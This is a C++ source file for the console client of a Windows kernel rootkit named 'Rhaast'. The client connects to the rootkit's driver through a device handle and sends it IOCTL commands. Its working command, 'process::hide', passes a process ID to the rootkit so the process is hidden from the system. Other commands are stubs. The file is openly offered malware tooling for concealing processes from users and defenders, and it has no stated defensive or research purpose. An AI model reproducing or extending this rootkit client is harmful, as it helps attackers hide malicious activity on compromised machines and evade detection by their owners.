#include <Rhaast.h>

#define ARGS_CHECK_LEN( l )             \
    if ( args.size() <= l ) {           \
        FmtNotEnoughArgs( args[ 0 ] );  \
        success = false;                \
        goto END;                       \
    }

#define FAIL_END    success = false; goto END;

/*!
 * @brief
 *      init connection with driver
 *
 * @param DriverName
 *      driver name to connect to
 */
Rhaast::Rhaast(
    std::string DriverName
) {
    /* try to connect now */
    RhaastConnect( DriverName );
}

/*!
 * @brief
 *      closes connection and cleans up resources
 */
Rhaast::~Rhaast(
    VOID
) {
    /* todo: free resources */
}

/*!
 * @brief
 *      check if the client has a connection/handle to the rootkit
 *
 * @return if the client is connected
 */
BOOL Rhaast::IsConnected(
    VOID
) {
    return Handle ? TRUE : FALSE;
}

/*!
 * @brief
 *      main rhaast input/output routine.
 *      creates an input field loop and dispatches
 *      given command
 */
VOID Rhaast::Routine(
    VOID
) {
    auto input = std::vector<std::string>();
    auto line  = std::string();

    /* check if we are connected */
    if ( ! IsConnected() ) {
        FmtErrorNotConnected();
    }

    /* input dispatch routine */
    do {
        input.clear();

        /* display console */
        std::cout << std::endl;
        std::cout << "[Rhaast] #> ";

        /* read input */
        getline( std::cin, line );

        /* another space */
        std::cout << std::endl;

        /* split string */
        StringTokenize( line, ' ', input );

        /* check if it is connected */
        if ( ! IsConnected() )
        {
            /* check if it is trying to connect to the driver */
            if ( input[ 0 ] != "rhaast::connect" ) {
                FmtErrorNotConnected();
                continue;
            }
        }

        /* now finally dispatch input */
        if ( ! DispatchInput( input ) ) {
            spdlog::error( "failed while executing command" );
        } else {
            spdlog::info( "successfully executed command" );
        }

        /* do we wanna exit now? */
        if ( ExitNow ) {
            break;
        }

    } while ( TRUE );
}

/*!
 * @brief
 *      dispatch input
 *
 * @param args
 *      input command to dispatch
 *
 * @return if given input was successfully dispatched
 */
BOOL Rhaast::DispatchInput(
    std::vector<std::string> args
) {
    bool success = true;

    if ( args[ 0 ] == "help" ) {

        FmtShowHelp();

    } else if ( args[ 0 ] == "exit" ) {

        Exit();

    } else if ( args[ 0 ] == "rhaast::connect" ) {

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 1 )

        /* if already connected then just close the connection
         * and reconnect to the specified driver name */
        if ( IsConnected() ) {
            spdlog::warn( "killing existing connection !" );

            /* close handle */
            CloseHandle( Handle );
            Handle = NULL;
        }

        /* try to connect to it */
        if ( ! RhaastConnect( args[ 1 ] ) ) {
            spdlog::info( "CreateFile failed: {}", GetLastError() );
            FAIL_END
        }

        spdlog::info( "connected to rhaast rootkit via \"{}\"", args[ 1 ] );

    } else if ( args[ 0 ] == "rhaast::disconnect" ) {

        /* close handle */
        CloseHandle( Handle );
        Handle = NULL;

        spdlog::info( "disconnected from rhaast rootkit" );

    } else if ( args[ 0 ] == "process::hide" ) {

        ULONG  Pid  = 0;
        BUFFER Name = { 0 };

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 1 )

        /* check if arg is a number */
        if ( ! StringIsNumber( args[ 1 ] ) ) {
            spdlog::error( "specified argument is not a number" );
            FAIL_END
        }

        /* convert pid string to int */
        Pid = std::stoi( args[ 1 ].c_str() );

        /* TODO: check if process exists */
        if ( ProcessQueryNameById( Pid, &Name ) )
        {
            spdlog::info( "process to hide:" );
            spdlog::info( "   - process id   : {}", Pid );
            spdlog::info( "   - process name : {}", std::string( ( PCHAR ) Name.Buffer ) );

            /* send command */
            if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_HIDE, &Pid, sizeof( ULONG ) ) ) ) ) {
                spdlog::info( "process successfully hidden" );
            } else {
                spdlog::info( "failed while hiding process" );
            }

            /* free process name memory */
            if ( Name.Buffer ) {
                RtlSecureZeroMemory( Name.Buffer, Name.Length );
                HeapFree( GetProcessHeap(), 0, Name.Buffer );
                Name.Buffer = nullptr;
            }
        }

    } else if ( args[ 0 ] == "process::unhide" ) {

    } else {

        spdlog::error( "command not found: {}", args[ 0 ] );
        spdlog::warn( "to see available command type: help (command)" );
        success = false;

    }

END:
    return success;
}

/*!
 * @brief
 *      simply print out the message that the client
 *      is not connected to the rootkit
 */
VOID Rhaast::FmtErrorNotConnected(
    VOID
) {
    spdlog::warn( "not connected with rhaast rootkit !" );
    spdlog::info( "connect to rootkit using: rhaast::connect <DriverName>" );
    spdlog::info( "more info type: help (command)" );
}

/*!
 * @brief
 *      show help and available commands
 */
VOID Rhaast::FmtShowHelp(
    VOID
) {
    spdlog::info( "rhaast help:" );

}

/*!
 * @brief
 *      shows the message that not enough
 *      arguments has been specified
 *
 * @param command
 *      command string to use
 */
VOID Rhaast::FmtNotEnoughArgs(
    std::string command
) {
    spdlog::info( "not enough args has been specified for \"{}\"", command );
}

/*!
 * @brief
 *      prints out exit message and sets ExitNow flag
 */
VOID Rhaast::Exit(
    VOID
) {
    spdlog::warn( "exiting rhaast client..." );

    /* tell the routine to exit now */
    ExitNow = true;
}

/*!
 * @brief
 *      attempts to connect to the rhaast rootkit
 *
 * @param DriverName
 *      driver name to connect to
 *
 * @return
 *      if successfully connected to it
 */
BOOL Rhaast::RhaastConnect(
    std::string DriverName
) {

    /* try to open a handle to the rootkit */
    if ( ( Handle = CreateFileA(
        DriverName.c_str(),
        GENERIC_WRITE | GENERIC_READ,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    ) ) == INVALID_HANDLE_VALUE ) {
        Handle = NULL;
    }

    return IsConnected();
}

/*!
 * @brief
 *      Send commands to the connected rhaast rootkit
 *
 * @param Command
 *      Command Id
 *
 * @param Buffer
 *      Buffer to be send
 *
 * @param Size
 *      Size of buffer
 *
 * @return
 *      status while executing/sending command
 */
NTSTATUS Rhaast::RhaastSend(
    ULONG Command,
    PVOID Buffer,
    ULONG Size
) {
    NTSTATUS NtStatus = STATUS_SUCCESS;
    DWORD    BytesRet = 0;

    if ( ! DeviceIoControl(
        Handle,
        CTL_CODE( 0x8000, Command, METHOD_BUFFERED, FILE_ANY_ACCESS ),
        Buffer,
        Size,
        nullptr,
        0,
        &BytesRet,
        nullptr
    ) ) {
        spdlog::error( "DeviceIoControl Failed: {}", GetLastError() );
        NtStatus = STATUS_UNSUCCESSFUL;
    }

    return NtStatus;
}




